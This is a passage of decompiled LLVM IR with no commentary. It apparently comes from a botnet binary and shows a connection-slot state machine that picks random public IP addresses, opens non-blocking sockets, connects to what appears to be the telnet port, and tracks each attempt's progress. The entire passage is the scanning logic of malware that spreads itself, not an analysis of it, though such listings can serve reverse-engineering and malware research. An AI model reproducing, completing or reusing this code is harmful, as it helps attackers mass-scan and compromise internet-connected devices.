  %v5_8051fb6104 = icmp sgt i32 %stack_var_-56.0, 0
  br i1 %v5_8051fb6104, label %dec_label_pc_8051f70, label %dec_label_pc_8051fb8.preheader

dec_label_pc_8051f70:                             ; preds = %dec_label_pc_8051eb5, %dec_label_pc_8051f70.dec_label_pc_8051f70_crit_edge
  %v0_8051f7c = phi i32 [ %v0_8051f7c.pre, %dec_label_pc_8051f70.dec_label_pc_8051f70_crit_edge ], [ %v1_8051f64, %dec_label_pc_8051eb5 ]
  %storemerge6105 = phi i32 [ %v4_8051fad, %dec_label_pc_8051f70.dec_label_pc_8051f70_crit_edge ], [ 0, %dec_label_pc_8051eb5 ]
  store i32 %v2_8051f36, i32* %edx.global-to-local, align 4
  %v2_8051f76 = mul i32 %storemerge6105, 32
  %v2_8051f79 = add i32 %v2_8051f76, %v2_8051f36
  store i32 %v2_8051f79, i32* %eax.global-to-local, align 4
  %v1_8051f7f = add i32 %v0_8051f7c, -8
  %v2_8051f7f = inttoptr i32 %v1_8051f7f to i32*
  store i32 32, i32* %v2_8051f7f, align 4
  %v1_8051f81 = add i32 %v0_8051f7c, -12
  %v2_8051f81 = inttoptr i32 %v1_8051f81 to i32*
  store i32 0, i32* %v2_8051f81, align 4
  %v0_8051f83 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051f83 = add i32 %v0_8051f7c, -16
  %v3_8051f83 = inttoptr i32 %v2_8051f83 to i32*
  store i32 %v0_8051f83, i32* %v3_8051f83, align 4
  %v3_8051f84 = inttoptr i32 %storemerge6105 to i8*
  %v4_8051f84 = call i32 @__GI_memset(i8* %v3_8051f84, i32 %tmp26, i32 %tmp14)
  %v2_8051f95 = or i32 %v2_8051f76, 9
  %v3_8051f95 = add i32 %v2_8051f95, %v2_8051f36
  %v4_8051f95 = inttoptr i32 %v3_8051f95 to i8*
  store i8 1, i8* %v4_8051f95, align 1
  %v1_8051fa5 = add i32 %v2_8051f79, 28
  store i32 %v1_8051fa5, i32* %edx.global-to-local, align 4
  %v2_8051fab = inttoptr i32 %v1_8051fa5 to i32*
  store i32 %v1_8051ef3, i32* %v2_8051fab, align 4
  %v4_8051fad = add nuw nsw i32 %storemerge6105, 1
  store i32 %v4_8051fad, i32* %eax.global-to-local, align 4
  %v5_8051fb6 = icmp slt i32 %v4_8051fad, %stack_var_-56.0
  br i1 %v5_8051fb6, label %dec_label_pc_8051f70.dec_label_pc_8051f70_crit_edge, label %dec_label_pc_8051fb8.preheader

dec_label_pc_8051f70.dec_label_pc_8051f70_crit_edge: ; preds = %dec_label_pc_8051f70
  %v0_8051f7c.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8051f70

dec_label_pc_8051fb8.preheader:                   ; preds = %dec_label_pc_8051f70, %dec_label_pc_8051eb5
  %v2_8052244 = ptrtoint i32* %stack_var_-320 to i32
  %tmp60 = bitcast i32* %stack_var_-320 to i8*
  %v2_80522a0 = ptrtoint i32* %stack_var_-328 to i32
  %v2_80522eb = ptrtoint i32* %stack_var_-332 to i32
  %v2_80522f2 = ptrtoint i32* %stack_var_-336 to i32
  %v2_805297b = ptrtoint i32* %stack_var_-192 to i32
  %v2_8052b5f = ptrtoint i32* %stack_var_-256 to i32
  %v4_8052b62 = bitcast i32* %stack_var_-192 to i8*
  %v5_8052bb869 = icmp sgt i32 %tmp14, 0
  br label %dec_label_pc_8051fb8

dec_label_pc_8051fb8:                             ; preds = %dec_label_pc_8051fb8, %dec_label_pc_8052d64, %dec_label_pc_8051fb8.preheader
  %stack_var_-648.0 = phi i32 [ %tmp15, %dec_label_pc_8051fb8.preheader ], [ %stack_var_-648.0, %dec_label_pc_8051fb8 ], [ %stack_var_-648.2, %dec_label_pc_8052d64 ]
  %stack_var_-644.0 = phi i32 [ %tmp16, %dec_label_pc_8051fb8.preheader ], [ %stack_var_-644.0, %dec_label_pc_8051fb8 ], [ %stack_var_-644.3, %dec_label_pc_8052d64 ]
  %stack_var_-640.0 = phi i32 [ %tmp17, %dec_label_pc_8051fb8.preheader ], [ %stack_var_-640.0, %dec_label_pc_8051fb8 ], [ %stack_var_-640.3, %dec_label_pc_8052d64 ]
  %stack_var_-628.0 = phi i32 [ %tmp24, %dec_label_pc_8051fb8.preheader ], [ %stack_var_-628.0, %dec_label_pc_8051fb8 ], [ %stack_var_-628.1, %dec_label_pc_8052d64 ]
  %stack_var_-624.0 = phi i32 [ %tmp25, %dec_label_pc_8051fb8.preheader ], [ %stack_var_-624.0, %dec_label_pc_8051fb8 ], [ %stack_var_-624.1, %dec_label_pc_8052d64 ]
  store i32 0, i32* %eax.global-to-local, align 4
  br i1 %v5_8051fb6104, label %dec_label_pc_8051fc4, label %dec_label_pc_8051fb8

dec_label_pc_8051fc4:                             ; preds = %dec_label_pc_8051fb8, %dec_label_pc_8052d64
  %storemerge90 = phi i32 [ %v4_8052d64, %dec_label_pc_8052d64 ], [ 0, %dec_label_pc_8051fb8 ]
  %stack_var_-624.289 = phi i32 [ %stack_var_-624.1, %dec_label_pc_8052d64 ], [ %stack_var_-624.0, %dec_label_pc_8051fb8 ]
  %stack_var_-628.288 = phi i32 [ %stack_var_-628.1, %dec_label_pc_8052d64 ], [ %stack_var_-628.0, %dec_label_pc_8051fb8 ]
  %stack_var_-640.485 = phi i32 [ %stack_var_-640.3, %dec_label_pc_8052d64 ], [ %stack_var_-640.0, %dec_label_pc_8051fb8 ]
  %stack_var_-644.484 = phi i32 [ %stack_var_-644.3, %dec_label_pc_8052d64 ], [ %stack_var_-644.0, %dec_label_pc_8051fb8 ]
  %stack_var_-648.383 = phi i32 [ %stack_var_-648.2, %dec_label_pc_8052d64 ], [ %stack_var_-648.0, %dec_label_pc_8051fb8 ]
  store i32 %v2_8051f36, i32* %edx.global-to-local, align 4
  %v2_8051fca = mul i32 %storemerge90, 32
  %v2_8051fcd = add i32 %v2_8051fca, %v2_8051f36
  %v1_8051fcf = add i32 %v2_8051fcd, 16
  store i32 %v1_8051fcf, i32* %eax.global-to-local, align 4
  %v1_8051fd2 = inttoptr i32 %v1_8051fcf to i32*
  %v2_8051fd2 = load i32, i32* %v1_8051fd2, align 16
  store i32 %v2_8051fd2, i32* %eax.global-to-local, align 4
  %v1_8051fd4 = icmp eq i32 %v2_8051fd2, 0
  %v1_8051fd6 = icmp eq i1 %v1_8051fd4, false
  br i1 %v1_8051fd6, label %dec_label_pc_8051ff9, label %dec_label_pc_8051fd8

dec_label_pc_8051fd8:                             ; preds = %dec_label_pc_8051fc4
  store i32 %storemerge90, i32* @ebx, align 4
  %v0_8051fdb = load i32, i32* @esp, align 4
  %v1_8051fde = add i32 %v0_8051fdb, -16
  %v2_8051fde = inttoptr i32 %v1_8051fde to i32*
  store i32 0, i32* %v2_8051fde, align 4
  %v1_8051fe0 = inttoptr i32 %storemerge90 to i32*
  %v2_8051fe0 = call i32 @__GI_time(i32* %v1_8051fe0)
  store i32 %v2_8051fe0, i32* %ecx.global-to-local, align 4
  store i32 %v2_8051f36, i32* %edx.global-to-local, align 4
  %v0_8051fed = load i32, i32* @ebx, align 4
  %v2_8051fef = mul i32 %v0_8051fed, 32
  %v2_8051ff2 = add i32 %v2_8051fef, %v2_8051f36
  %v1_8051ff4 = add i32 %v2_8051ff2, 16
  store i32 %v1_8051ff4, i32* %eax.global-to-local, align 4
  %v2_8051ff7 = inttoptr i32 %v1_8051ff4 to i32*
  store i32 %v2_8051fe0, i32* %v2_8051ff7, align 16
  br label %dec_label_pc_8051ff9

dec_label_pc_8051ff9:                             ; preds = %dec_label_pc_8051fc4, %dec_label_pc_8051fd8
  store i32 %v2_8051f36, i32* %edx.global-to-local, align 4
  store i32 %v2_8051fca, i32* %eax.global-to-local, align 4
  %v2_8052002 = or i32 %v2_8051fca, 8
  %v3_8052002 = add i32 %v2_8052002, %v2_8051f36
  %v4_8052002 = inttoptr i32 %v3_8052002 to i8*
  %v5_8052002 = load i8, i8* %v4_8052002, align 8
  %v6_8052002 = zext i8 %v5_8052002 to i32
  %v8_8052002 = and i32 %v2_8051fca, -256
  %v9_8052002 = or i32 %v6_8052002, %v8_8052002
  store i32 %v9_8052002, i32* %eax.global-to-local, align 4
  store i32 %v6_8052002, i32* %edx.global-to-local, align 4
  store i32 %v6_8052002, i32* @edi, align 4
  %v1_8052026 = mul nuw nsw i32 %v6_8052002, 4
  %v2_8052026 = add nuw nsw i32 %v1_8052026, 134653076
  %v3_8052026 = inttoptr i32 %v2_8052026 to i32*
  %v4_8052026 = load i32, i32* %v3_8052026, align 4
  store i32 %v4_8052026, i32* %eax.global-to-local, align 4
  switch i8 %v5_8052002, label %dec_label_pc_8052d64 [
    i8 0, label %dec_label_pc_805202f
    i8 1, label %dec_label_pc_805223a
    i8 2, label %dec_label_pc_80523f0
    i8 3, label %dec_label_pc_80524cd
    i8 4, label %dec_label_pc_80525ba
    i8 5, label %dec_label_pc_8052697
    i8 6, label %dec_label_pc_8052784
    i8 7, label %dec_label_pc_8052951
    i8 8, label %dec_label_pc_8052bdd
  ]

dec_label_pc_805202f:                             ; preds = %dec_label_pc_8051ff9
  store i32 %v2_8051f36, i32* %edx.global-to-local, align 4
  store i32 %v2_8051fca, i32* %eax.global-to-local, align 4
  %v2_8052038 = or i32 %v2_8051fca, 9
  %v3_8052038 = add i32 %v2_8052038, %v2_8051f36
  %v4_8052038 = inttoptr i32 %v3_8052038 to i8*
  %v5_8052038 = load i8, i8* %v4_8052038, align 1
  %v10_805203c = icmp eq i8 %v5_8052038, 1
  %v1_805203e = icmp eq i1 %v10_805203c, false
  store i32 %v2_8051f36, i32* %edx.global-to-local, align 4
  store i32 %v2_8051fca, i32* %eax.global-to-local, align 4
  br i1 %v1_805203e, label %dec_label_pc_805209d, label %dec_label_pc_8052040

dec_label_pc_8052040:                             ; preds = %dec_label_pc_805202f
  %v1_805204b = add i32 %v2_8051fcd, 28
  store i32 %v1_805204b, i32* %eax.global-to-local, align 4
  %v1_805204e = inttoptr i32 %v1_805204b to i32*
  %v2_805204e = load i32, i32* %v1_805204e, align 4
  store i32 %v2_8051f36, i32* %edx.global-to-local, align 4
  store i32 %v2_8051fcd, i32* %eax.global-to-local, align 4
  %v0_805205f = load i32, i32* @esp, align 4
  %v1_8052062 = add i32 %v0_805205f, -8
  %v2_8052062 = inttoptr i32 %v1_8052062 to i32*
  store i32 32, i32* %v2_8052062, align 4
  %v1_8052064 = add i32 %v0_805205f, -12
  %v2_8052064 = inttoptr i32 %v1_8052064 to i32*
  store i32 0, i32* %v2_8052064, align 4
  %v0_8052066 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052066 = add i32 %v0_805205f, -16
  %v3_8052066 = inttoptr i32 %v2_8052066 to i32*
  store i32 %v0_8052066, i32* %v3_8052066, align 4
  %v2_8052067 = load i32, i32* %stack_var_-608, align 4
  %v3_8052067 = inttoptr i32 %v6_8052002 to i8*
  %v4_8052067 = call i32 @__GI_memset(i8* %v3_8052067, i32 %v15_8051e38, i32 %v2_8052067)
  store i32 %v1_805204b, i32* %edx.global-to-local, align 4
  store i32 %v2_805204e, i32* %eax.global-to-local, align 4
  store i32 %v2_805204e, i32* %v1_805204e, align 4
  store i32 %storemerge90, i32* @ebx, align 4
  %v0_8052085 = call i32 @getRandomPublicIP()
  store i32 %v0_8052085, i32* %ecx.global-to-local, align 4
  store i32 %v2_8051f36, i32* %edx.global-to-local, align 4
  %v0_805208f = load i32, i32* @ebx, align 4
  %v2_8052091 = mul i32 %v0_805208f, 32
  %v2_8052094 = add i32 %v2_8052091, %v2_8051f36
  %v1_8052096 = or i32 %v2_8052094, 4
  store i32 %v1_8052096, i32* %eax.global-to-local, align 4
  %v2_8052099 = inttoptr i32 %v1_8052096 to i32*
  store i32 %v0_8052085, i32* %v2_8052099, align 4
  br label %dec_label_pc_805210e

dec_label_pc_805209d:                             ; preds = %dec_label_pc_805202f
  %v5_80520a6 = load i8, i8* %v4_8052038, align 1
  %v6_80520a6 = zext i8 %v5_80520a6 to i32
  %v9_80520a6 = or i32 %v6_80520a6, %v8_8052002
  store i32 %v9_80520a6, i32* %eax.global-to-local, align 4
  %v4_80520aa = icmp eq i8 %v5_80520a6, 0
  %v1_80520ac = icmp eq i1 %v4_80520aa, false
  br i1 %v1_80520ac, label %dec_label_pc_805210e, label %dec_label_pc_80520ae

dec_label_pc_80520ae:                             ; preds = %dec_label_pc_805209d
  store i32 %v2_8051f36, i32* %edx.global-to-local, align 4
  store i32 %v2_8051fca, i32* %eax.global-to-local, align 4
  %v2_80520b7 = or i32 %v2_8051fca, 10
  %v3_80520b7 = add i32 %v2_80520b7, %v2_8051f36
  %v4_80520b7 = inttoptr i32 %v3_80520b7 to i8*
  %v5_80520b7 = load i8, i8* %v4_80520b7, align 2
  %v6_80520b7 = zext i8 %v5_80520b7 to i32
  %v9_80520b7 = or i32 %v6_80520b7, %v8_8052002
  store i32 %v9_80520b7, i32* %eax.global-to-local, align 4
  %tmp113 = icmp ult i8 %v5_80520b7, 99
  br i1 %tmp113, label %dec_label_pc_80520d2, label %dec_label_pc_80520bf

dec_label_pc_80520bf:                             ; preds = %dec_label_pc_80520ae
  store i32 %v2_8051f36, i32* %edx.global-to-local, align 4
  store i32 %v2_8051fca, i32* %eax.global-to-local, align 4
  store i8 1, i8* %v4_8052038, align 1
  br label %dec_label_pc_8052d64

dec_label_pc_80520d2:                             ; preds = %dec_label_pc_80520ae
  store i32 %v2_8051f36, i32* %edx.global-to-local, align 4
  store i32 %v2_8051fca, i32* %eax.global-to-local, align 4
  %v5_80520dd = load i8, i8* %v4_80520b7, align 2
  %v6_80520dd = zext i8 %v5_80520dd to i32
  %v9_80520dd = or i32 %v6_80520dd, %v8_8052002
  %v1_80520e1 = add i32 %v9_80520dd, 1
  store i32 %v1_80520e1, i32* %ecx.global-to-local, align 4
  %v1_80520ec = trunc i32 %v1_80520e1 to i8
  store i8 %v1_80520ec, i8* %v4_80520b7, align 2
  store i32 %v2_8051f36, i32* %edx.global-to-local, align 4
  store i32 %v2_8051fca, i32* %eax.global-to-local, align 4
  %v2_80520fb = or i32 %v2_8051fca, 11
  %v3_80520fb = add i32 %v2_80520fb, %v2_8051f36
  %v4_80520fb = inttoptr i32 %v3_80520fb to i8*
  %v5_80520fb = load i8, i8* %v4_80520fb, align 1
  %v6_80520fb = zext i8 %v5_80520fb to i32
  %v9_80520fb = or i32 %v6_80520fb, %v8_8052002
  %v1_80520ff = add i32 %v9_80520fb, 1
  store i32 %v1_80520ff, i32* %ecx.global-to-local, align 4
  store i32 %v2_8051f36, i32* %edx.global-to-local, align 4
  store i32 %v2_8051fca, i32* %eax.global-to-local, align 4
  %v1_805210a = trunc i32 %v1_80520ff to i8
  store i8 %v1_805210a, i8* %v4_80520fb, align 1
  br label %dec_label_pc_805210e

dec_label_pc_805210e:                             ; preds = %dec_label_pc_805209d, %dec_label_pc_8052040, %dec_label_pc_80520d2
  store i32 2, i32* %stack_var_-608, align 4
  %v0_8052117 = load i32, i32* @esp, align 4
  %v1_805211a = add i32 %v0_8052117, -16
  %v2_805211a = inttoptr i32 %v1_805211a to i32*
  store i32 23, i32* %v2_805211a, align 4
  %v0_805211c = load i32, i32* %stack_var_-608, align 4
  %v1_805211c = call i32 @htons(i32 %v0_805211c)
  %v0_8052121 = load i32, i32* @esp, align 4
  %v1_805212e = add i32 %v0_8052121, 8
  %v2_805212e = inttoptr i32 %v1_805212e to i32*
  store i32 8, i32* %v2_805212e, align 4
  %v1_8052130 = add i32 %v0_8052121, 4
  %v2_8052130 = inttoptr i32 %v1_8052130 to i32*
  store i32 0, i32* %v2_8052130, align 4
  store i32 %v15_8051edf, i32* %eax.global-to-local, align 4
  %v3_805213b = inttoptr i32 %v0_8052121 to i32*
  store i32 %v15_8051edf, i32* %v3_805213b, align 4
  %sext = mul i32 %v1_805211c, 65536
  %v1_805213c = sdiv i32 %sext, 65536
  %v4_805213c = inttoptr i32 %v1_805213c to i8*
  %v5_805213c = call i32 @__GI_memset(i8* %v4_805213c, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8052141 = load i32, i32* @esp, align 4
  store i32 %v2_8051f36, i32* %edx.global-to-local, align 4
  %v1_805214f = or i32 %v2_8051fcd, 4
  store i32 %v1_805214f, i32* %eax.global-to-local, align 4
  %v1_8052152 = inttoptr i32 %v1_805214f to i32*
  %v2_8052152 = load i32, i32* %v1_8052152, align 4
  store i32 %v2_8052152, i32* %eax.global-to-local, align 4
  store i32 %storemerge90, i32* @ebx, align 4
  %v1_8052160 = add i32 %v0_8052141, 8
  %v2_8052160 = inttoptr i32 %v1_8052160 to i32*
  store i32 0, i32* %v2_8052160, align 4
  %v1_8052162 = add i32 %v0_8052141, 4
  %v2_8052162 = inttoptr i32 %v1_8052162 to i32*
  store i32 1, i32* %v2_8052162, align 4
  %v2_8052164 = inttoptr i32 %v0_8052141 to i32*
  store i32 2, i32* %v2_8052164, align 4
  %v1_8052166 = load i32, i32* %stack_var_-600, align 4
  %v3_8052166 = call i32 @socket(i32 %v2_8052152, i32 %v1_8052166, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8052166, i32* @ecx, align 4
  %v0_8052173 = load i32, i32* @ebx, align 4
  %v2_8052175 = mul i32 %v0_8052173, 32
  %v3_8052178 = add i32 %v2_8052175, %v2_8051f36
  %v4_8052178 = inttoptr i32 %v3_8052178 to i32*
  store i32 %v3_8052166, i32* %v4_8052178, align 16
  store i32 %v2_8051f36, i32* %edx.global-to-local, align 4
  store i32 %v2_8051fca, i32* %eax.global-to-local, align 4
  %v3_8052184 = inttoptr i32 %v2_8051fcd to i32*
  %v4_8052184 = load i32, i32* %v3_8052184, align 16
  store i32 %v4_8052184, i32* %eax.global-to-local, align 4
  %v10_8052187 = icmp eq i32 %v4_8052184, -1
  br i1 %v10_8052187, label %dec_label_pc_8052d64, label %dec_label_pc_8052190

dec_label_pc_8052190:                             ; preds = %dec_label_pc_805210e
  store i32 %v2_8051f36, i32* %edx.global-to-local, align 4
  store i32 %v2_8051fca, i32* %eax.global-to-local, align 4
  %v4_8052199 = load i32, i32* %v3_8052184, align 16
  store i32 %v4_8052199, i32* %eax.global-to-local, align 4
  %v0_805219c = load i32, i32* @esp, align 4
  %v1_805219f = add i32 %v0_805219c, -8
  %v2_805219f = inttoptr i32 %v1_805219f to i32*
  store i32 0, i32* %v2_805219f, align 4
  %v1_80521a1 = add i32 %v0_805219c, -12
  %v2_80521a1 = inttoptr i32 %v1_80521a1 to i32*
  store i32 3, i32* %v2_80521a1, align 4
  %v0_80521a3 = load i32, i32* %eax.global-to-local, align 4
  %v2_80521a3 = add i32 %v0_805219c, -16
  %v3_80521a3 = inttoptr i32 %v2_80521a3 to i32*
  store i32 %v0_80521a3, i32* %v3_80521a3, align 4
  %v1_80521a4 = load i32, i32* %stack_var_-600, align 4
  %v3_80521a4 = call i32 @fcntl(i32 %v2_8052152, i32 %v1_80521a4, i32 ptrtoint (i32* @0 to i32))
  %v0_80521a9 = load i32, i32* @esp, align 4
  %v12_80521ae = or i32 %v3_80521a4, 2048
  store i32 %v12_80521ae, i32* @ecx, align 4
  store i32 %v2_8051f36, i32* %edx.global-to-local, align 4
  store i32 %v2_8051fca, i32* %eax.global-to-local, align 4
  %v4_80521ba = load i32, i32* %v3_8052184, align 16
  store i32 %v4_80521ba, i32* %eax.global-to-local, align 4
  %v2_80521c0 = add i32 %v0_80521a9, 8
  %v3_80521c0 = inttoptr i32 %v2_80521c0 to i32*
  store i32 %v12_80521ae, i32* %v3_80521c0, align 4
  %v1_80521c1 = add i32 %v0_80521a9, 4
  %v2_80521c1 = inttoptr i32 %v1_80521c1 to i32*
  store i32 4, i32* %v2_80521c1, align 4
  %v0_80521c3 = load i32, i32* %eax.global-to-local, align 4
  %v3_80521c3 = inttoptr i32 %v0_80521a9 to i32*
  store i32 %v0_80521c3, i32* %v3_80521c3, align 4
  %v1_80521c4 = load i32, i32* %stack_var_-600, align 4
  %v3_80521c4 = call i32 @fcntl(i32 %v2_8052152, i32 %v1_80521c4, i32 ptrtoint (i32* @0 to i32))
  %v0_80521c9 = load i32, i32* @esp, align 4
  store i32 %v2_8051ed9, i32* @ecx, align 4
  store i32 %v2_8051f36, i32* %edx.global-to-local, align 4
  store i32 %v2_8051fca, i32* %eax.global-to-local, align 4
  %v4_80521db = load i32, i32* %v3_8052184, align 16
  store i32 %v4_80521db, i32* %eax.global-to-local, align 4
  %v1_80521e1 = add i32 %v0_80521c9, 8
  %v2_80521e1 = inttoptr i32 %v1_80521e1 to i32*
  store i32 16, i32* %v2_80521e1, align 4
  %v2_80521e3 = add i32 %v0_80521c9, 4
  %v3_80521e3 = inttoptr i32 %v2_80521e3 to i32*
  store i32 %v2_8051ed9, i32* %v3_80521e3, align 4
  %v0_80521e4 = load i32, i32* %eax.global-to-local, align 4
  %v3_80521e4 = inttoptr i32 %v0_80521c9 to i32*
  store i32 %v0_80521e4, i32* %v3_80521e4, align 4
  %v1_80521e5 = load i32, i32* %stack_var_-600, align 4
  %v3_80521e5 = call i32 @connect(i32 %v2_8052152, i32 %v1_80521e5, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80521e5, i32* %eax.global-to-local, align 4
  %v0_80521ea = load i32, i32* @esp, align 4
  %v1_80521ea = add i32 %v0_80521ea, 16
  %v10_80521ed = icmp eq i32 %v3_80521e5, -1
  %v1_80521f0 = icmp eq i1 %v10_80521ed, false
  br i1 %v1_80521f0, label %dec_label_pc_805221b, label %dec_label_pc_80521f2

dec_label_pc_80521f2:                             ; preds = %dec_label_pc_8052190
  %v1_80521f2 = call i32 @__errno_location(i32 %v2_8052152)
  store i32 %v1_80521f2, i32* %eax.global-to-local, align 4
  %v1_80521f7 = inttoptr i32 %v1_80521f2 to i32*
  %v2_80521f7 = load i32, i32* %v1_80521f7, align 4
  store i32 %v2_80521f7, i32* %eax.global-to-local, align 4
  %v9_80521f9 = icmp eq i32 %v2_80521f7, 115
  br i1 %v9_80521f9, label %dec_label_pc_80521f2.dec_label_pc_805221b_crit_edge, label %dec_label_pc_80521fe

dec_label_pc_80521f2.dec_label_pc_805221b_crit_edge: ; preds = %dec_label_pc_80521f2
  %v0_8052227.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805221b

dec_label_pc_80521fe:                             ; preds = %dec_label_pc_80521f2
  store i32 %v2_8051f36, i32* @edx, align 4
  store i32 %v2_8051fcd, i32* %eax.global-to-local, align 4
  %v0_805220a = load i32, i32* @esp, align 4
  %v2_805220d = add i32 %v0_805220a, -16
  %v3_805220d = inttoptr i32 %v2_805220d to i32*
  store i32 %v2_8051fcd, i32* %v3_805220d, align 4
  %v1_805220e = call i32 @reset_ipstate(i32 %v2_8052152)
  store i32 %v1_805220e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052d64

dec_label_pc_805221b:                             ; preds = %dec_label_pc_80521f2.dec_label_pc_805221b_crit_edge, %dec_label_pc_8052190
  %v0_8052227 = phi i32 [ %v0_8052227.pre, %dec_label_pc_80521f2.dec_label_pc_805221b_crit_edge ], [ %v1_80521ea, %dec_label_pc_8052190 ]
  store i32 %v2_8051f36, i32* @edx, align 4
  store i32 %v2_8051fcd, i32* %eax.global-to-local, align 4
  %v1_805222a = add i32 %v0_8052227, -12
  %v2_805222a = inttoptr i32 %v1_805222a to i32*
  store i32 1, i32* %v2_805222a, align 4
  %v0_805222c = load i32, i32* %eax.global-to-local, align 4
  %v2_805222c = add i32 %v0_8052227, -16
  %v3_805222c = inttoptr i32 %v2_805222c to i32*
  store i32 %v0_805222c, i32* %v3_805222c, align 4
  %v1_805222d = load i32, i32* %stack_var_-600, align 4
  %v2_805222d = inttoptr i32 %v2_8052152 to i32*
  %v3_805222d = call i32 @advance_state(i32* %v2_805222d, i32 %v1_805222d)
  store i32 %v3_805222d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052d64

dec_label_pc_805223a:                             ; preds = %dec_label_pc_8051ff9
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 32, i32* %ecx.global-to-local, align 4
  store i32 %v2_8052244, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_805224b = call i8* @_memset(i8* %tmp60, i32 0, i32 32)
  %v6_805224b = ptrtoint i8* %v5_805224b to i32
  store i32 %v6_805224b, i32* %ecx.global-to-local, align 4
  store i32 %v2_8051f36, i32* %edx.global-to-local, align 4
  store i32 %v2_8051fca, i32* %eax.global-to-local, align 4
  %v3_805225c = inttoptr i32 %v2_8051fcd to i32*
  %v4_805225c = load i32, i32* %v3_805225c, align 16
  %v2_8052261 = udiv i32 %v4_805225c, 32
  store i32 %v2_8052261, i32* %ecx.global-to-local, align 4
  store i32 %v2_8051f36, i32* %edx.global-to-local, align 4
  store i32 %v2_8051fca, i32* %eax.global-to-local, align 4
  %v4_805226d = load i32, i32* %v3_805225c, align 16
  %v1_8052270 = urem i32 %v4_805226d, 32
  store i32 %v1_8052270, i32* %eax.global-to-local, align 4
  %v0_8052273 = load i32, i32* @ebp, align 4
  %v2_8052273 = mul nuw nsw i32 %v2_8052261, 4
  %v3_8052273 = add nsw i32 %v2_8052273, -316
  %v4_8052273 = add i32 %v3_8052273, %v0_8052273
  %v5_8052273 = inttoptr i32 %v4_8052273 to i32*
  %v6_8052273 = load i32, i32* %v5_8052273, align 4
  %v9_8052273 = shl i32 1, %v1_8052270
  %v12_8052273 = or i32 %v6_8052273, %v9_8052273
  store i32 %v12_8052273, i32* %v5_8052273, align 4
  store i32 0, i32* %stack_var_-328, align 4
  store i32 %v2_8051f36, i32* %edx.global-to-local, align 4
  store i32 %v2_8051fca, i32* %eax.global-to-local, align 4
  %v4_8052297 = load i32, i32* %v3_805225c, align 16
  %v1_805229a = add i32 %v4_8052297, 1
  store i32 %v1_805229a, i32* %edx.global-to-local, align 4
  %v0_805229d = load i32, i32* @esp, align 4
  %v2_80522a6 = add i32 %v0_805229d, -16
  %v3_80522a6 = inttoptr i32 %v2_80522a6 to i32*
  store i32 %v2_80522a0, i32* %v3_80522a6, align 4
  %v1_80522a7 = add i32 %v0_805229d, -20
  %v2_80522a7 = inttoptr i32 %v1_80522a7 to i32*
  store i32 0, i32* %v2_80522a7, align 4
  store i32 %v2_8052244, i32* %eax.global-to-local, align 4
  %v2_80522af = add i32 %v0_805229d, -24
  %v3_80522af = inttoptr i32 %v2_80522af to i32*
  store i32 %v2_8052244, i32* %v3_80522af, align 4
  %v1_80522b0 = add i32 %v0_805229d, -28
  %v2_80522b0 = inttoptr i32 %v1_80522b0 to i32*
  store i32 0, i32* %v2_80522b0, align 4
  %v0_80522b2 = load i32, i32* %edx.global-to-local, align 4
  %v2_80522b2 = add i32 %v0_805229d, -32
  %v3_80522b2 = inttoptr i32 %v2_80522b2 to i32*
  store i32 %v0_80522b2, i32* %v3_80522b2, align 4
  %v0_80522b3 = load i32, i32* %stack_var_-328, align 4
  %v2_80522b3 = load i32, i32* %stack_var_-320, align 4
  %v5_80522b3 = call i32 @__libc_select(i32 %v0_80522b3, i32 %arg1, i32 %v2_80522b3, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_80522b3, i32* %eax.global-to-local, align 4
  %v0_80522b8 = load i32, i32* @esp, align 4
  %v12_80522be = icmp eq i32 %v5_80522b3, 1
  %v1_80522c2 = icmp eq i1 %v12_80522be, false
  br i1 %v1_80522c2, label %dec_label_pc_8052388, label %dec_label_pc_80522c8

dec_label_pc_80522c8:                             ; preds = %dec_label_pc_805223a
  store i32 4, i32* %stack_var_-332, align 4
  store i32 0, i32* %stack_var_-336, align 4
  store i32 %v2_8051f36, i32* %edx.global-to-local, align 4
  store i32 %v2_8051fca, i32* %eax.global-to-local, align 4
  %v4_80522e5 = load i32, i32* %v3_805225c, align 16
  store i32 %v4_80522e5, i32* %edx.global-to-local, align 4
  %v2_80522f1 = add i32 %v0_80522b8, 16
  %v3_80522f1 = inttoptr i32 %v2_80522f1 to i32*
  store i32 %v2_80522eb, i32* %v3_80522f1, align 4
  store i32 %v2_80522f2, i32* %eax.global-to-local, align 4
  %v2_80522f8 = add i32 %v0_80522b8, 12
  %v3_80522f8 = inttoptr i32 %v2_80522f8 to i32*
  store i32 %v2_80522f2, i32* %v3_80522f8, align 4
  %v1_80522f9 = add i32 %v0_80522b8, 8
  %v2_80522f9 = inttoptr i32 %v1_80522f9 to i32*
  store i32 4, i32* %v2_80522f9, align 4
  %v1_80522fb = add i32 %v0_80522b8, 4
  %v2_80522fb = inttoptr i32 %v1_80522fb to i32*
  store i32 1, i32* %v2_80522fb, align 4
  %v0_80522fd = load i32, i32* %edx.global-to-local, align 4
  %v3_80522fd = inttoptr i32 %v0_80522b8 to i32*
  store i32 %v0_80522fd, i32* %v3_80522fd, align 4
  %v0_80522fe = load i32, i32* %stack_var_-336, align 4
  %v2_80522fe = call i32 @getsockopt(i32 %v0_80522fe)
  %v0_8052303 = load i32, i32* @esp, align 4
  %v3_8052306 = load i32, i32* %stack_var_-336, align 4
  store i32 %v3_8052306, i32* %eax.global-to-local, align 4
  %v1_805230c = icmp eq i32 %v3_8052306, 0
  store i32 %v2_8051f36, i32* @edx, align 4
  br i1 %v1_805230c, label %dec_label_pc_805232d, label %dec_label_pc_8052310

dec_label_pc_8052310:                             ; preds = %dec_label_pc_80522c8
  store i32 %v2_8051fcd, i32* %eax.global-to-local, align 4
  %v2_805231f = add i32 %v0_8052303, 16
  %v3_805231f = inttoptr i32 %v2_805231f to i32*
  store i32 %v2_8051fcd, i32* %v3_805231f, align 4
  %v0_8052320 = load i32, i32* %stack_var_-336, align 4
  %v1_8052320 = call i32 @reset_ipstate(i32 %v0_8052320)
